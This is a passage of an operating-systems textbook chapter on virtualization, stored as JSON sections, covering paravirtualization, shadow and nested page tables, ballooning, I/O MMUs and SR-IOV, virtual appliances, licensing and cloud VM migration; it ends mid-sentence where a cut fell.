        "content": "7.5 ARE HYPERVISORS MICROKERNELS DONE RIGHT?\r\nBoth type 1 and type 2 hypervisors work with unmodified guest operating sys\u0002tems, but have to jump through hoops to get good performance. We hav e seen that\r\nparavirtualization takes a different approach by modifying the source code of the\r\nguest operating system instead. Rather than performing sensitive instructions, the\r\nparavirtualized guest executes hypercalls. In effect the guest operating system is\r\nacting like a user program making system calls to the operating system (the hyper\u0002visor). When this route is taken, the hypervisor must define an interface consisting\r\nof a set of procedure calls that guest operating systems can use. This set of calls\r\nforms what is effectively an API (Application Programming Interface) even\r\nthough it is an interface for use by guest operating systems, not application pro\u0002grams.\r\nGoing one step further, by removing all the sensitive instructions from the op\u0002erating system and just having it make hypercalls to get system services like I/O,\r\nwe have turned the hypervisor into a microkernel, like that of Fig. 1-26. The idea,\r\nexplored in paravirtualization, is that emulating peculiar hardware instructions is\r\nan unpleasant and time-consuming task. It requires a call into the hypervisor and\r\nthen emulating the exact semantics of a complicated instruction. It is far better just\r\nto have the guest operating system call the hypervisor (or microkernel) to do I/O,\r\nand so on.\r\nIndeed, some researchers have argued that we should perhaps consider hyper\u0002visors as ‘‘microkernels done right’’ (Hand et al., 2005). The first thing to mention\r\nis that this is a highly controversial topic and some researchers have vocally\r\nopposed the notion, arguing that the difference between the two is not fundamental\r\nto begin with (Heiser et al., 2006). Others suggest that compared to microkernels,\r\nhypervisors may not even be that well suited for building secure systems, and\r\nadvocate that they be extended with kernel functionality like message passing and\r\nmemory sharing (Hohmuth et al., 2004). Finally, some researchers argue that per\u0002haps hypervisors are not even ‘‘operating systems research done right’’ (Roscoe et\r\nal., 2007). Since nobody said anything about operating system textbooks done right\n484 VIRTUALIZATION AND THE CLOUD CHAP. 7\r\n(or wrong)—yet—we think we do right by exploring the similarity between hyper\u0002visors and microkernels a bit more.\r\nThe main reason the first hypervisors emulated the complete machine was the\r\nlack of availability of source code for the guest operating system (e.g., for Win\u0002dows) or the vast number of variants (e.g., for Linux). Perhaps in the future the\r\nhypervisor/microkernel API will be standardized, and subsequent operating sys\u0002tems will be designed to call it instead of using sensitive instructions. Doing so\r\nwould make virtual machine technology easier to support and use.\r\nThe difference between true virtualization and paravirtualization is illustrated\r\nin Fig. 7-5. Here we have two virtual machines being supported on VT hardware.\r\nOn the left is an unmodified version of Windows as the guest operating system.\r\nWhen a sensitive instruction is executed, the hardware causes a trap to the hypervi\u0002sor, which then emulates it and returns. On the right is a version of Linux modified\r\nso that it no longer contains any sensitive instructions. Instead, when it needs to do\r\nI/O or change critical internal registers (such as the one pointing to the page\r\ntables), it makes a hypervisor call to get the work done, just like an application pro\u0002gram making a system call in standard Linux.\r\nUnmodified Windows Modified Linux\r\nTrap due\r\nto sensitive\r\ninstruction\r\nTrap due\r\nto hypervisor\r\ncall\r\nTrue virtualization Paravirtualization\r\nType 1 hypervisor Microkernel\r\nHardware\r\nFigure 7-5. True virtualization and paravirtualization\r\nIn Fig. 7-5 we have shown the hypervisor as being divided into two parts sepa\u0002rated by a dashed line. In reality, only one program is running on the hardware.\r\nOne part of it is responsible for interpreting trapped sensitive instructions, in this\r\ncase, from Windows. The other part of it just carries out hypercalls. In the figure\r\nthe latter part is labeled ‘‘microkernel.’’ If the hypervisor is intended to run only\r\nparavirtualized guest operating systems, there is no need for the emulation of sen\u0002sitive instructions and we have a true microkernel, which just provides very basic\r\nservices such as process dispatching and managing the MMU. The boundary be\u0002tween a type 1 hypervisor and a microkernel is vague already and will get even less\r\nclear as hypervisors begin acquiring more and more functionality and hypercalls,\r\nas seems likely. Again, this subject is controversial, but it is increasingly clear that\r\nthe program running in kernel mode on the bare hardware should be small and reli\u0002able and consist of thousands, not millions, of lines of code.\nSEC. 7.5 ARE HYPERVISORS MICROKERNELS DONE RIGHT? 485\r\nParavirtualizing the guest operating system raises a number of issues. First, if\r\nthe sensitive instructions are replaced with calls to the hypervisor, how can the op\u0002erating system run on the native hardware? After all, the hardware does not under\u0002stand these hypercalls. And second, what if there are multiple hypervisors avail\u0002able in the marketplace, such as VMware, the open source Xen originally from the\r\nUniversity of Cambridge, and Microsoft’s Hyper-V, all with somewhat different\r\nhypervisor APIs? How can the kernel be modified to run on all of them?\r\nAmsden et al. (2006) have proposed a solution. In their model, the kernel is\r\nmodified to call special procedures whenever it needs to do something sensitive.\r\nTogether these procedures, called the VMI (Virtual Machine Interface), form a\r\nlow-level layer that interfaces with the hardware or hypervisor. These procedures\r\nare designed to be generic and not tied to any specific hardware platform or to any\r\nparticular hypervisor.\r\nAn example of this technique is given in Fig. 7-6 for a paravirtualized version\r\nof Linux they call VMI Linux (VMIL). When VMI Linux runs on the bare hard\u0002ware, it has to be linked with a library that issues the actual (sensitive) instruction\r\nneeded to do the work, as shown in Fig. 7-6(a). When running on a hypervisor, say\r\nVMware or Xen, the guest operating system is linked with different libraries that\r\nmake the appropriate (and different) hypercalls to the underlying hypervisor. In\r\nthis way, the core of the operating system remains portable yet is hypervisor\r\nfriendly and still efficient.\r\nHardware\r\nVMIL/HWinterface lib.\r\nSensitive\r\ninstruction\r\nexecuted by\r\nHW\r\nVMI Linux\r\nHardware\r\nVMware\r\nVMI Linux\r\nVMIL to Vmware lib.\r\nHypervisor call\r\nHardware\r\nXen\r\nVMI Linux\r\nVMIL to Xen library\r\nHypervisor call\r\n(a) (b) (c)\r\nFigure 7-6. VMI Linux running on (a) the bare hardware, (b) VMware, (c) Xen\r\nOther proposals for a virtual machine interface have also been made. Another\r\npopular one is called paravirt ops. The idea is conceptually similar to what we\r\ndescribed above, but different in the details. Essentially, a group of Linux vendors\r\nthat included companies like IBM, VMware, Xen, and Red Hat advocated a hyper\u0002visor-agnostic interface for Linux. The interface, included in the mainline kernel\r\nfrom version 2.6.23 onward, allows the kernel to talk to whatever hypervisor is\r\nmanaging the physical hardware.\n486 VIRTUALIZATION AND THE CLOUD CHAP. 7"
      },
      "7.6 MEMORY VIRTUALIZATION": {
        "page": 517,
        "content": "7.6 MEMORY VIRTUALIZATION\r\nSo far we have addressed the issue of how to virtualize the CPU. But a com\u0002puter system has more than just a CPU. It also has memory and I/O devices. They\r\nhave to be virtualized, too. Let us see how that is done.\r\nModern operating systems nearly all support virtual memory, which is basical\u0002ly a mapping of pages in the virtual address space onto pages of physical memory.\r\nThis mapping is defined by (multilevel) page tables. Typically the mapping is set\r\nin motion by having the operating system set a control register in the CPU that\r\npoints to the top-level page table. Virtualization greatly complicates memory man\u0002agement. In fact, it took hardware manufacturers two tries to get it right.\r\nSuppose, for example, a virtual machine is running, and the guest operating\r\nsystem in it decides to map its virtual pages 7, 4, and 3 onto physical pages 10, 11,\r\nand 12, respectively. It builds page tables containing this mapping and loads a\r\nhardware register to point to the top-level page table. This instruction is sensitive.\r\nOn a VT CPU, it will trap; with dynamic translation it will cause a call to a hyper\u0002visor procedure; on a paravirtualized operating system, it will generate a hypercall.\r\nFor simplicity, let us assume it traps into a type 1 hypervisor, but the problem is the\r\nsame in all three cases.\r\nWhat does the hypervisor do now? One solution is to actually allocate physi\u0002cal pages 10, 11, and 12 to this virtual machine and set up the actual page tables to\r\nmap the virtual machine’s virtual pages 7, 4, and 3 to use them. So far, so good.\r\nNow suppose a second virtual machine starts and maps its virtual pages 4, 5,\r\nand 6 onto physical pages 10, 11, and 12 and loads the control register to point to\r\nits page tables. The hypervisor catches the trap, but what should it do? It cannot\r\nuse this mapping because physical pages 10, 11, and 12 are already in use. It can\r\nfind some free pages, say 20, 21, and 22, and use them, but it first has to create new\r\npage tables mapping the virtual pages 4, 5, and 6 of virtual machine 2 onto 20, 21,\r\nand 22. If another virtual machine starts and tries to use physical pages 10, 11, and\r\n12, it has to create a mapping for them. In general, for each virtual machine the\r\nhypervisor needs to create a shadow page table that maps the virtual pages used\r\nby the virtual machine onto the actual pages the hypervisor gav e it.\r\nWorse yet, every time the guest operating system changes its page tables, the\r\nhypervisor must change the shadow page tables as well. For example, if the guest\r\nOS remaps virtual page 7 onto what it sees as physical page 200 (instead of 10),\r\nthe hypervisor has to know about this change. The trouble is that the guest operat\u0002ing system can change its page tables by just writing to memory. No sensitive oper\u0002ations are required, so the hypervisor does not even know about the change and\r\ncertainly cannot update the shadow page tables used by the actual hardware.\r\nA possible (but clumsy) solution is for the hypervisor to keep track of which\r\npage in the guest’s virtual memory contains the top-level page table. It can get this\r\ninformation the first time the guest attempts to load the hardware register that\r\npoints to it because this instruction is sensitive and traps. The hypervisor can create\nSEC. 7.6 MEMORY VIRTUALIZATION 487\r\na shadow page table at this point and also map the top-level page table and the\r\npage tables it points to as read only. A subsequent attempts by the guest operating\r\nsystem to modify any of them will cause a page fault and thus give control to the\r\nhypervisor, which can analyze the instruction stream, figure out what the guest OS\r\nis trying to do, and update the shadow page tables accordingly. It is not pretty, but\r\nit is doable in principle.\r\nAnother, equally clumsy, solution is to do exactly the opposite. In this case, the\r\nhypervisor simply allows the guest to add new mappings to its page tables at will.\r\nAs this is happening, nothing changes in the shadow page tables. In fact, the hyper\u0002visor is not even aware of it. However, as soon as the guest tries to access any of\r\nthe new pages, a fault will occur and control reverts to the hypervisor. The hyper\u0002visor inspects the guest’s page tables to see if there is a mapping that it should add,\r\nand if so, adds it and reexecutes the faulting instruction. What if the guest removes\r\na mapping from its page tables? Clearly, the hypervisor cannot wait for a page fault\r\nto happen, because it will not happen. Removing a mapping from a page table hap\u0002pens by way of the INVLPG instruction (which is really intended to invalidate a\r\nTLB entry). The hypervisor therefore intercepts this instruction and removes the\r\nmapping from the shadow page table also. Again, not pretty, but it works.\r\nBoth of these techniques incur many page faults, and page faults are expensive.\r\nWe typically distinguish between ‘‘normal’’ page faults that are caused by guest\r\nprograms that access a page that has been paged out of RAM, and page faults that\r\nare related to ensuring the shadow page tables and the guest’s page tables are in\r\nsync. The former are known as guest-induced page faults, and while they are\r\nintercepted by the hypervisor, they must be reinjected into the guest. This is not\r\ncheap at all. The latter are known as hypervisor-induced page faults and they are\r\nhandled by updating the shadow page tables.\r\nPage faults are always expensive, but especially so in virtualized environments,\r\nbecause they lead to so-called VM exits. A VM exit is a situation in which the\r\nhypervisor regains control. Consider what the CPU needs to do for such a VM exit.\r\nFirst, it records the cause of the VM exit, so the hypervisor knows what to do. It\r\nalso records the address of the guest instruction that caused the exit. Next, a con\u0002text switch is done, which includes saving all the registers. Then, it loads the\r\nhypervisor’s processor state. Only then can the hypervisor start handling the page\r\nfault, which was expensive to begin with. Oh, and when it is all done, it should re\u0002verse these steps. The whole process may take tens of thousands of cycles, or\r\nmore. No wonder people bend over backward to reduce the number of exits.\r\nIn a paravirtualized operating system, the situation is different. Here the\r\nparavirtualized OS in the guest knows that when it is finished changing some proc\u0002ess’ page table, it had better inform the hypervisor. Consequently, it first changes\r\nthe page table completely, then issues a hypervisor call telling the hypervisor about\r\nthe new page table. Thus, instead of a protection fault on every update to the page\r\ntable, there is one hypercall when the whole thing has been updated, obviously a\r\nmore efficient way to do business.\n488 VIRTUALIZATION AND THE CLOUD CHAP. 7\r\nHardware Support for Nested Page Tables\r\nThe cost of handling shadow page tables led chip makers to add hardware sup\u0002port for nested page tables. Nested page tables is the term used by AMD. Intel\r\nrefers to them as EPT (Extended Page Tables). They are similar and aim to re\u0002move most of the overhead by handling the additional page-table manipulation all\r\nin hardware, all without any traps. Interestingly, the first virtualization extensions\r\nin Intel’s x86 hardware did not include support for memory virtualization at all.\r\nWhile these VT-extended processors removed many bottlenecks concerning CPU\r\nvirtualization, poking around in page tables was as expensive as ever. It took a few\r\nyears for AMD and Intel to produce the hardware to virtualize memory efficiently.\r\nRecall that even without virtualization, the operating system maintains a map\u0002ping between the virtual pages and the physical page. The hardware ‘‘walks’’ these\r\npage tables to find the physical address that corresponds to a virtual address. Add\u0002ing more virtual machines simply adds an extra mapping. As an example, suppose\r\nwe need to translate a virtual address of a Linux process running on a type 1 hyper\u0002visor like Xen or VMware ESX Server to a physical address. In addition to the\r\nguest virtual addresses, we now also have guest physical addresses and subse\u0002quently host physical addresses (sometimes referred to as machine physical\r\naddresses). We hav e seen that without EPT, the hypervisor is responsible for\r\nmaintaining the shadow page tables explicitly. With EPT, the hypervisor still has\r\nan additional set of page tables, but now the CPU is able to handle much of the\r\nintermediate level in hardware also. In our example, the hardware first walks the\r\n‘‘regular’’ page tables to translate the guest virtual address to a guest physical ad\u0002dress, just as it would do without virtualization. The difference is that it also walks\r\nthe extended (or nested) page tables without software intervention to find the host\r\nphysical address, and it needs to do this every time a guest physical address is ac\u0002cessed. The translation is illustrated in Fig. 7-7.\r\nUnfortunately, the hardware may need to walk the nested page tables more fre\u0002quently then you might think. Let us suppose that the guest virtual address was not\r\ncached and requires a full page-table lookup. Every level in paging hierarchy\r\nincurs a lookup in the nested page tables. In other words, the number of memory\r\nreferences grows quadratically with the depth of the hierarchy. Even so, EPT dra\u0002matically reduces the number of VM exits. Hypervisors no longer need to map the\r\nguest’s page table read only and can do away with shadow page-table handling.\r\nBetter still, when switching virtual machines, it just changes this mapping, the\r\nsame way an operating system changes the mapping when switching processes.\r\nReclaiming Memory\r\nHaving all these virtual machines on the same physical hardware all with their\r\nown memory pages and all thinking they are the king of the mountain is great—\r\nuntil we need the memory back. This is particularly important in the event of\nSEC. 7.6 MEMORY VIRTUALIZATION 489\r\nLevel 1 offset\r\n63 48 47 39 38 30 29 21 20 12 11 0\r\nLevel 2 offset Level 3 offset Level 4 offset page offset\r\n+\r\n+\r\netc.\r\nGuest pointer to\r\nlevel 1 page table\r\nGuest pointer to entry in\r\nlevel 1 page table\r\nGuest pointer to entry in\r\nlevel 2 page table\r\nLook up in nested page tables\r\nLook up in nested page tables\r\nFigure 7-7. Extended/nested page tables are walked every time a guest physical\r\naddress is accessed—including the accesses for each level of the guest’s page ta\u0002bles.\r\novercommitment of memory, where the hypervisor pretends that the total amount\r\nof memory for all virtual machines combined is more than the total amount of\r\nphysical memory present on the system. In general, this is a good idea, because it\r\nallows the hypervisor to admit more and more beefy virtual machines at the same\r\ntime. For instance, on a machine with 32 GB of memory, it may run three virtual\r\nmachines each thinking it has 16 GB of memory. Clearly, this does not fit. Howev\u0002er, perhaps the three machines do not really need the maximum amount of physical\r\nmemory at the same time. Or perhaps they share pages that have the same content\r\n(such as the Linux kernel) in different virtual machines in an optimization known\r\nas deduplication. In that case, the three virtual machines use a total amount of\r\nmemory that is less than 3 times 16 GB. We will discuss deduplication later; for\r\nthe moment the point is that what looks like a good distribution now, may be a\r\npoor distribution as the workloads change. Maybe virtual machine 1 needs more\r\nmemory, while virtual machine 2 could do with fewer pages. In that case, it would\r\nbe nice if the hypervisor could transfer resources from one virtual machine to an\u0002other and make the system as a whole benefit. The question is, how can we take\r\naw ay memory pages safely if that memory is given to a virtual machine already?\r\nIn principle, we could use yet another level of paging. In case of memory\r\nshortage, the hypervisor would then page out some of the virtual machine’s pages,\r\njust as an operating system may page out some of an application’s pages. The\r\ndrawback of this approach is that the hypervisor should do this, and the hypervisor\r\nhas no clue about which pages are the most valuable to the guest. It is very likely\r\nto page out the wrong ones. Even if it does pick the right pages to swap (i.e., the\r\npages that the guest OS would also have picked), there is still more trouble ahead.\n490 VIRTUALIZATION AND THE CLOUD CHAP. 7\r\nFor instance, suppose that the hypervisor pages out a page P. A little later, the\r\nguest OS also decides to page out this page to disk. Unfortunately, the hypervisor’s\r\nswap space and the guest’s swap space are not the same. In other words, the hyper\u0002visor must first page the contents back into memory, only to see the guest write it\r\nback out to disk immediately. Not very efficient.\r\nA common solution is to use a trick known as ballooning, where a small bal\u0002loon module is loaded in each VM as a pseudo device driver that talks to the hyper\u0002visor. The balloon module may inflate at the hypervisor’s request by allocating\r\nmore and more pinned pages, and deflate by deallocating these pages. As the bal\u0002loon inflates, memory scarcity in the guest increases. The guest operating system\r\nwill respond by paging out what it believes are the least valuable pages—which is\r\njust what we wanted. Conversely, as the balloon deflates, more memory becomes\r\navailable for the guest to allocate. In other words, the hypervisor tricks the operat\u0002ing system into making tough decisions for it. In politics, this is known as passing\r\nthe buck (or the euro, pound, yen, etc.)."
      },
      "7.7 I/O VIRTUALIZATION": {
        "page": 521,
        "content": "7.7 I/O VIRTUALIZATION\r\nHaving looked at CPU and memory virtualization, we next examine I/O virtu\u0002alization. The guest operating system will typically start out probing the hardware\r\nto find out what kinds of I/O devices are attached. These probes will trap to the\r\nhypervisor. What should the hypervisor do? One approach is for it to report back\r\nthat the disks, printers, and so on are the ones that the hardware actually has. The\r\nguest will then load device drivers for these devices and try to use them. When the\r\ndevice drivers try to do actual I/O, they will read and write the device’s hardware\r\ndevice registers. These instructions are sensitive and will trap to the hypervisor,\r\nwhich could then copy the needed values to and from the hardware registers, as\r\nneeded.\r\nBut here, too, we have a problem. Each guest OS could think it owns an entire\r\ndisk partition, and there may be many more virtual machines (hundreds) than there\r\nare actual disk partitions. The usual solution is for the hypervisor to create a file or\r\nregion on the actual disk for each virtual machine’s physical disk. Since the guest\r\nOS is trying to control a disk that the real hardware has (and which the hypervisor\r\nunderstands), it can convert the block number being accessed into an offset into the\r\nfile or disk region being used for storage and do the I/O.\r\nIt is also possible for the disk that the guest is using to be different from the\r\nreal one. For example, if the actual disk is some brand-new high-performance disk\r\n(or RAID) with a new interface, the hypervisor could advertise to the guest OS that\r\nit has a plain old IDE disk and let the guest OS install an IDE disk driver. When\r\nthis driver issues IDE disk commands, the hypervisor converts them into com\u0002mands to drive the new disk. This strategy can be used to upgrade the hardware\r\nwithout changing the software. In fact, this ability of virtual machines to remap\nSEC. 7.7 I/O VIRTUALIZATION 491\r\nhardware devices was one of the reasons VM/370 became popular: companies\r\nwanted to buy new and faster hardware but did not want to change their software.\r\nVirtual machine technology made this possible.\r\nAnother interesting trend related to I/O is that the hypervisor can take the role\r\nof a virtual switch. In this case, each virtual machine has a MAC address and the\r\nhypevisor switches frames from one virtual machine to another—just like an Ether\u0002net switch would do. Virtual switches have sev eral advantages. For instance, it is\r\nvery easy to reconfigure them. Also, it is possible to augment the switch with addi\u0002tional functionality, for instance for additional security.\r\nI/O MMUs\r\nAnother I/O problem that must be solved somehow is the use of DMA, which\r\nuses absolute memory addresses. As might be expected, the hypervisor has to\r\nintervene here and remap the addresses before the DMA starts. However, hard\u0002ware already exists with an I/O MMU, which virtualizes the I/O the same way the\r\nMMU virtualizes the memory. I/O MMU exists in different forms and shapes for\r\nmany processor architectures. Even if we limit ourselves to the x86, Intel and\r\nAMD have slightly different technology. Still, the idea is the same. This hardware\r\neliminates the DMA problem.\r\nJust like regular MMUs, the I/O MMU uses page tables to map a memory ad\u0002dress that a device wants to use (the device address) to a physical address. In a vir\u0002tual environment, the hypervisor can set up the page tables in such a way that a de\u0002vice performing DMA will not trample over memory that does not belong to the\r\nvirtual machine on whose behalf it is working.\r\nI/O MMUs offer different advantages when dealing with a device in a virtu\u0002alized world. Device pass through allows the physical device to be directly as\u0002signed to a particular virtual machine. In general, it would be ideal if device ad\u0002dress space were exactly the same as the guest’s physical address space. However,\r\nthis is unlikely—unless you have an I/O MMU. The MMU allows the addresses to\r\nremapped transparently, and both the device and the virtual machine are blissfully\r\nunaware of the address translation that takes place under the hood.\r\nDevice isolation ensures that a device assigned to a virtual machine can direct\u0002ly access that virtual machine without jeopardizing the integrity of the other guests.\r\nIn other words, the I/O MMU prevents rogue DMA traffic, just as a normal MMU\r\nprevents rogue memory accesses from processes—in both cases accesses to\r\nunmapped pages result in faults.\r\nDMA and addresses are not the whole I/O story, unfortunately. For complete\u0002ness, we also need to virtualize interrupts, so that the interrupt generated by a de\u0002vice arrives at the right virtual machine, with the right interrupt number. Modern\r\nI/O MMUs therefore support interrupt remapping. Say, a device sends a mes\u0002sage signaled interrupt with number 1. This message first hits the I/O MMU that\r\nwill use the interrupt remapping table to translate to a new message destined for\n492 VIRTUALIZATION AND THE CLOUD CHAP. 7\r\nthe CPU that currently runs the virtual machine and with the vector number that\r\nthe VM expects (e.g., 66).\r\nFinally, having an I/O MMU also helps 32-bit devices access memory above 4\r\nGB. Normally, such devices are unable to access (e.g., DMA to) addresses beyond\r\n4 GB, but the I/O MMU can easily remap the device’s lower addresses to any ad\u0002dress in the physical larger address space.\r\nDevice Domains\r\nA different approach to handling I/O is to dedicate one of the virtual machines\r\nto run a standard operating system and reflect all I/O calls from the other ones to it.\r\nThis approach is enhanced when paravirtualization is used, so the command being\r\nissued to the hypervisor actually says what the guest OS wants (e.g., read block\r\n1403 from disk 1) rather than being a series of commands writing to device regis\u0002ters, in which case the hypervisor has to play Sherlock Holmes and figure out what\r\nit is trying to do. Xen uses this approach to I/O, with the virtual machine that does\r\nI/O called domain 0.\r\nI/O virtualization is an area in which type 2 hypervisors have a practical advan\u0002tage over type 1 hypervisors: the host operating system contains the device drivers\r\nfor all the weird and wonderful I/O devices attached to the computer. When an ap\u0002plication program attempts to access a strange I/O device, the translated code can\r\ncall the existing device driver to get the work done. With a type 1 hypervisor, the\r\nhypervisor must either contain the driver itself, or make a call to a driver in domain\r\n0, which is somewhat similar to a host operating system. As virtual machine tech\u0002nology matures, future hardware is likely to allow application programs to access\r\nthe hardware directly in a secure way, meaning that device drivers can be linked di\u0002rectly with application code or put in separate user-mode servers (as in MINIX3),\r\nthereby eliminating the problem.\r\nSingle Root I/O Virtualization\r\nDirectly assigning a device to a virtual machine is not very scalable. With four\r\nphysical networks you can support no more than four virtual machines that way.\r\nFor eight virtual machines you need eight network cards, and to run 128 virtual\r\nmachines—well, let’s just say that it may be hard to find your computer buried\r\nunder all those network cables.\r\nSharing devices among multiple hypervisors in software is possible, but often\r\nnot optimal because an emulation layer (or device domain) interposes itself be\u0002tween hardware and the drivers and the guest operating systems. The emulated de\u0002vice frequently does not implement all the advanced functions supported by the\r\nhardware. Ideally, the virtualization technology would offer the equivalence of de\u0002vice pass through of a single device to multiple hypervisors, without any overhead.\r\nVirtualizing a single device to trick every virtual machine into believing that it has\nSEC. 7.7 I/O VIRTUALIZATION 493\r\nexclusive access to its own device is much easier if the hardware actually does the\r\nvirtualization for you. On PCIe, this is known as single root I/O virtualization.\r\nSingle root I/O virtualization (SR-IOV) allows us to bypass the hypervisor’s\r\ninvolvement in the communication between the driver and the device. Devices that\r\nsupport SR-IOV provide an independent memory space, interrupts and DMA\r\nstreams to each virtual machine that uses it (Intel, 2011). The device appears as\r\nmultiple separate devices and each can be configured by separate virtual machines.\r\nFor instance, each will have a separate base address register and address space. A\r\nvirtual machine maps one of these memory areas (used for instance to configure\r\nthe device) into its address space.\r\nSR-IOV provides access to the device in two flavors: PF (Physical Functions)\r\nand (Virtual Functions). PFs are full PCIe functions and allow the device to be\r\nconfigured in whatever way the administrator sees fit. Physical functions are not\r\naccessible to guest operating systems. VFs are lightweight PCIe functions that do\r\nnot offer such configuration options. They are ideally suited for virtual machines.\r\nIn summary, SR-IOV allows devices to be virtualized in (up to) hundreds of virtual\r\nfunctions that trick virtual machines into believing they are the sole owner of a de\u0002vice. For example, given an SR-IOV network interface, a virtual machine is able to\r\nhandle its virtual network card just like a physical one. Better still, many modern\r\nnetwork cards have separate (circular) buffers for sending and receiving data, dedi\u0002cated to this virtual machines. For instance, the Intel I350 series of network cards\r\nhas eight send and eight receive queues"
      },
      "7.8 VIRTUAL APPLIANCES": {
        "page": 524,
        "content": "7.8 VIRTUAL APPLIANCES\r\nVirtual machines offer an interesting solution to a problem that has long\r\nplagued users, especially users of open source software: how to install new appli\u0002cation programs. The problem is that many applications are dependent on numer\u0002ous other applications and libraries, which are themselves dependent on a host of\r\nother software packages, and so on. Furthermore, there may be dependencies on\r\nparticular versions of the compilers, scripting languages, and the operating system.\r\nWith virtual machines now available, a software developer can carefully con\u0002struct a virtual machine, load it with the required operating system, compilers, li\u0002braries, and application code, and freeze the entire unit, ready to run. This virtual\r\nmachine image can then be put on a CD-ROM or a Website for customers to install\r\nor download. This approach means that only the software developer has to under\u0002stand all the dependencies. The customers get a complete package that actually\r\nworks, completely independent of which operating system they are running and\r\nwhich other software, packages, and libraries they hav e installed. These ‘‘shrink\u0002wrapped’’ virtual machines are often called virtual appliances. As an example,\r\nAmazon’s EC2 cloud has many pre-packaged virtual appliances available for its\r\nclients, which it offers as convenient software services (‘‘Software as a Service’’).\n494 VIRTUALIZATION AND THE CLOUD CHAP. 7"
      },
      "7.9 VIRTUAL MACHINES ON MULTICORE CPUS": {
        "page": 525,
        "content": "7.9 VIRTUAL MACHINES ON MULTICORE CPUS\r\nThe combination of virtual machines and multicore CPUs creates a whole new\r\nworld in which the number of CPUs available can be set by the software. If there\r\nare, say, four cores, and each can run, for example, up to eight virtual machines, a\r\nsingle (desktop) CPU can be configured as a 32-node multicomputer if need be,\r\nbut it can also have fewer CPUs, depending on the software. Never before has it\r\nbeen possible for an application designer to first choose how many CPUs he wants\r\nand then write the software accordingly. This is clearly a new phase in computing.\r\nMoreover, virtual machines can share memory. A typical example where this\r\nis useful is a single server hosting multiple instances of the same operating sys\u0002tems. All that has to be done is map physical pages into the address spaces of mul\u0002tiple virtual machines. Memory sharing is already available in deduplication solu\u0002tions. Deduplication does exactly what you think it does: avoids storing the same\r\ndata twice. It is a fairly common technique in storage systems, but is now appear\u0002ing in virtualization as well. In Disco, it was known as transparent page sharing\r\n(which requires modification to the guest), while VMware calls it content-based\r\npage sharing (which does not require any modification). In general, the technique\r\nrevolves around scanning the memory of each of the virtual machines on a host and\r\nhashing the memory pages. Should some pages produce an identical hash, the sys\u0002tem has to first check to see if they really are the same, and if so, deduplicate them,\r\ncreating one page with the actual content and two references to that page. Since the\r\nhypervisor controls the nested (or shadow) page tables, this mapping is straightfor\u0002ward. Of course, when either of the guests modifies a shared page, the change\r\nshould not be visible in the other virtual machine(s). The trick is to use copy on\r\nwrite so the modified page will be private to the writer.\r\nIf virtual machines can share memory, a single computer becomes a virtual\r\nmultiprocessor. Since all the cores in a multicore chip share the same RAM, a sin\u0002gle quad-core chip could easily be configured as a 32-node multiprocessor or a\r\n32-node multicomputer, as needed.\r\nThe combination of multicore, virtual machines, hypervisor, and microkernels\r\nis going to radically change the way people think about computer systems. Current\r\nsoftware cannot deal with the idea of the programmer determining how many\r\nCPUs are needed, whether they should be a multicomputer or a multiprocessor,\r\nand how minimal kernels of one kind or another fit into the picture. Future soft\u0002ware will have to deal with these issues. If you are a computer science or engineer\u0002ing student or professional, you could be the one to sort out all this stuff. Go for it!"
      },
      "7.10 LICENSING ISSUES": {
        "page": 525,
        "content": "7.10 LICENSING ISSUES\r\nSome software is licensed on a per-CPU basis, especially software for compa\u0002nies. In other words, when they buy a program, they hav e the right to run it on just\r\none CPU. What’s a CPU, anyway? Does this contract give them the right to run\nSEC. 7.10 LICENSING ISSUES 495\r\nthe software on multiple virtual machines all running on the same physical ma\u0002chine? Many software vendors are somewhat unsure of what to do here.\r\nThe problem is much worse in companies that have a license allowing them to\r\nhave n machines running the software at the same time, especially when virtual\r\nmachines come and go on demand.\r\nIn some cases, software vendors have put an explicit clause in the license for\u0002bidding the licensee from running the software on a virtual machine or on an unau\u0002thorized virtual machine. For companies that run all their software exclusively on\r\nvirtual machines, this could be a real problem. Whether any of these restrictions\r\nwill hold up in court and how users respond to them remains to be seen."
      },
      "7.11 CLOUDS": {
        "page": 526,
        "children": {
          "7.11.1 Clouds as a Service": {
            "page": 527,
            "content": "7.11.1 Clouds as a Service\r\nIn this section, we will look at clouds with a focus on virtualization and operat\u0002ing systems. Specifically, we consider clouds that offer direct access to a virtual\r\nmachine, which the user can use in any way he sees fit. Thus, the same cloud may\r\nrun different operating systems, possibly on the same hardware. In cloud terms,\r\nthis is known as IAAS (Infrastructure As A Service), as opposed to PAAS (Plat\u0002form As A Service, which delivers an environment that includes things such as a\r\nspecific OS, database, Web server, and so on), SAAS (Software As A Service,\r\nwhich offers access to specific software, such as Microsoft Office 365, or Google\r\nApps), and many other types of as-a-service. One example of an IAAS cloud is\r\nAmazon EC2, which happens to be based on the Xen hypervisor and counts multi\u0002ple hundreds of thousands of physical machines. Provided you have the cash, you\r\ncan have as much computing power as you need.\r\nClouds can transform the way companies do computing. Overall, consolidating\r\nthe computing resources in a small number of places (conveniently located near a\r\npower source and cheap cooling) benefits from economy of scale. Outsourcing\r\nyour processing means that you need not worry so much about managing your IT\r\ninfrastructure, backups, maintenance, depreciation, scalability, reliability, perfor\u0002mance, and perhaps security. All of that is done in one place and, assuming the\r\ncloud provider is competent, done well. You would think that IT managers are hap\u0002pier today than ten years ago. However, as these worries disappeared, new ones\r\nemerged. Can you really trust your cloud provider to keep your sensitive data safe?\r\nWill a competitor running on the same infrastructure be able to infer information\r\nyou wanted to keep private? What law(s) apply to your data (for instance, if the\r\ncloud provider is from the United States, is your data subject to the PATRIOT Act,\r\nev en if your company is in Europe)? Once you store all your data in cloud X, will\r\nyou be able to get them out again, or will you be tied to that cloud and its provider\r\nforever, something known as vendor lock-in?"
          },
          "7.11.2 Virtual Machine Migration": {
            "page": 527,
            "content": "7.11.2 Virtual Machine Migration\r\nVirtualization technology not only allows IAAS clouds to run multiple dif\u0002ferent operating systems on the same hardware at the same time, it also permits\r\nclever management. We hav e already discussed the ability to overcommit re\u0002sources, especially in combination with deduplication. Now we will look at anoth\u0002er management issue: what if a machine needs servicing (or even replacement)\r\nwhile it is running lots of important machines? Probably, clients will not be happy\r\nif their systems go down because the cloud provider wants to replace a disk drive.\r\nHypervisors decouple the virtual machine from the physical hardware. In other\r\nwords, it does not really matter to the virtual machine if it runs on this machine or\r\nthat machine. Thus, the administrator could simply shut down all the virtual ma\u0002chines and restart them again on a shiny new machine. Doing so, however, results\nSEC. 7.11 CLOUDS 497\r\nin significant downtime. The challenge is to move the virtual machine from the\r\nhardware that needs servicing to the new machine without taking it down at all.\r\nA slightly better approach might be to pause the virtual machine, rather than\r\nshut it down. During the pause, we copy over the memory pages used by 